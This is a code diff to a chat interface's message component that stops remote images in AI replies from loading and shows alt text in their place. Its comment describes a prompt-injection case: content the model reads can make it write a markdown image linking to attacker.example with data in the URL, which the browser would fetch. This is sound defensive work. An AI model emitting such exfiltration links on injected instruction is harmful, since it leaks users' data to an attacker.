@@ -18,6 +18,19 @@ export interface MessageBubbleProps {
   showReasoning?: boolean;
 }
 
+/**
+ * A reply is untrusted text: a page or a file the model read can make it write `![x](https://attacker.example/?d=...)`, and
+ * the browser would then load that image by itself and send the URL, with whatever the model put in it, to the attacker
+ * (AICHAT-26, finding F3). Remote images are therefore not loaded; the alt text is shown instead.
+ */
+function BlockedImage({ alt }: { alt?: string }) {
+  return (
+    <span data-testid="blocked-image" title="Remote images in replies are not loaded" className="italic text-muted-foreground">
+      [image not loaded{alt ? `: ${alt}` : ""}]
+    </span>
+  );
+}
+
 /** AC-52 (incremental content), AC-54 (stop), AC-57 (distinct queued state), AC-72/73 (error + retry). */
 export function MessageBubble({ message, currentUserId, onStop, onRetry, retrying, showReasoning = true }: MessageBubbleProps) {
   const isOtherMember =
@@ -70,7 +83,7 @@ export function MessageBubble({ message, currentUserId, onStop, onRetry, retryin
         {isOtherMember || isUser ? null : message.content ? (
           // Assistant replies are markdown; shadcn Typeset styles the rendered prose.
           <div className="typeset typeset-chat min-w-0">
-            <Markdown remarkPlugins={[remarkGfm]}>{message.content}</Markdown>
+            <Markdown remarkPlugins={[remarkGfm]} components={{ img: BlockedImage }}>{message.content}</Markdown>
           </div>
         ) : streaming && !reasoning && webFetches.length === 0 ? (
           <span className="flex h-6 items-center gap-1" aria-hidden="true">
